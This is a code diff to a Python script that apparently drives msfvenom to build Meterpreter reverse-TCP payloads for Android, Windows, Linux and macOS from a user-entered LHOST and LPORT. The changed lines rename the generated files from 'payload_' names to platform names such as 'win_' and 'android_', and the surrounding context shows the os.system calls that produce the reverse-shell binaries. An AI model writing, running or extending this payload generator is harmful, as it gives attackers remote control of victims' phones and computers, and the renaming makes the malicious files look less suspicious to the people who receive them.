@@ -93,7 +93,7 @@ Select option to create handler\n"""+CY+"""
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
                     print(B+"\nGenerating payload..........\n")
                     a=random.randint(1,99)
-                    st1="payload_"+str(a)+".apk"
+                    st1="android_"+str(a)+".apk"
                     st="msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
@@ -105,7 +105,7 @@ Select option to create handler\n"""+CY+"""
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
                     print(B+"\nGenerating payload..........\n")
                     a=random.randint(1,99)
-                    st1="payload_"+str(a)+".exe"
+                    st1="win_"+str(a)+".exe"
                     st="msfvenom -p windows/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
@@ -117,7 +117,7 @@ Select option to create handler\n"""+CY+"""
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
                     print(B+"\nGenerating payload..........\n")
                     a=random.randint(1,99)
-                    st1="payload_"+str(a)+".elf"
+                    st1="linux_"+str(a)+".elf"
                     st="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
@@ -129,7 +129,7 @@ Select option to create handler\n"""+CY+"""
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
                     print(B+"\nGenerating payload..........\n")
                     a=random.randint(1,99)
-                    st1="payload_"+str(a)+".macho"
+                    st1="macos_"+str(a)+".macho"
                     st="msfvenom -p osx/x86/shell_reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
@@ -295,6 +295,7 @@ Select option to create handler\n"""+CY+"""
                 print("")
             main()                
             sel()
+    #call
     mk()
     check()
     check2()
